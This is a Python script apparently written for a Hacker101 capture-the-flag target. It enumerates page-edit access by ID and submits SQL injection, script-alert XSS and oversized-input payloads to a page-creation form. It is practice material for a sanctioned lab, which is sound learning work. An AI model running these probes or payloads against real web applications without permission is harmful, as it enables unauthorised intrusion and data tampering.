import requests
import time

# Replace this URL with the actual URL of the web application
#base_url = 'http://example.com/page/'
base_url = 'https://c668764c5837611fe3cf8102c7f21f3c.ctf.hacker101.com'

def request_page(page_number):
    """Send a GET request to a specific page and print the response."""
    url = f"{base_url}/page/{page_number}"
    response = requests.get(url)
    print(f"Status Code for Page {page_number}: {response.status_code}")
    if response.status_code == 200:
        print(response.text)
        pass

def create_page():
    url = f"{base_url}/page/create"
    response = requests.post(url)
    print(f"Status Code: {response.status_code}")


def check_edit_page_access(start_page, end_page):
    for page_number in range(start_page, end_page + 1):
        edit_url = f"{base_url}/page/edit/{page_number}"
        response = requests.get(edit_url)
        
        # Check if the edit page is accessible
        if response.status_code == 200:
            print(f"Edit page {page_number} is accessible!")
        else:
            print(f"Edit page {page_number} returned status code: {response.status_code}")

def test_input_sanitization(input_value, path='/page/create', method='POST'):
    url = base_url + path
    data = {'title': input_value, 'body': 'Test content'}
    
    if method.upper() == 'POST':
        response = requests.post(url, data=data)
    else:
        # Assuming 'edit' uses POST but may require adapting for other methods
        response = requests.post(url, data=data)
    
    print(f"Status Code: {response.status_code}")
    if response.status_code == 200:
        print("Response: ", response.text[:100])  # Print the first 100 characters of the response
    else:
        print("Potential issue or input rejected.")

#request_page(4)
#create_page()

# Example usage: Checking pages 1 through 10
#check_edit_page_access(1, 10)

malicious_inputs = [
    "' OR '1'='1",                      # SQL Injection
    "<script>alert('XSS')</script>",    # Cross-Site Scripting
    "A"*3000,                           # Buffer Overflow / Input Length Test
]

for test_input in malicious_inputs:
    print(f"Testing with input: {test_input}")
    test_input_sanitization(test_input)
    print("-" * 60)  # Separator between tests
    time.sleep(5)